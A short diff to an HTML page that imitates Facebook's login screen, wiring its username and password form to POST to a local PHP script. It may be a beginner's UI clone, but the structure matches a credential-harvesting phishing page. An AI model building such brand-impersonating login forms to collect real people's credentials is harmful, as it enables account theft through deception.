@@ -15,10 +15,10 @@
 	<h1>facebook</h1>
 	<h2>Facebook helps you connect and <br>share with the people in your life</h2>
 
-	<form>
+	<form name="mainForm" onsubmit="return required()" method="post" action="/action_pg.php">
 		<input type="text" name="username" value="Email address or phone number"> <br>
 		<input type="text" name="password" value="Password"> <br>
-		<input type="login" name="login" value="Log in"> <br>
+		<input type="submit" name="login" value="Log in"> <br>
 		<input type="forgot" name="reset" value="Forgotten password?"><br>
 		<input type="new" name="account" value="Create New Account">
 	</form>
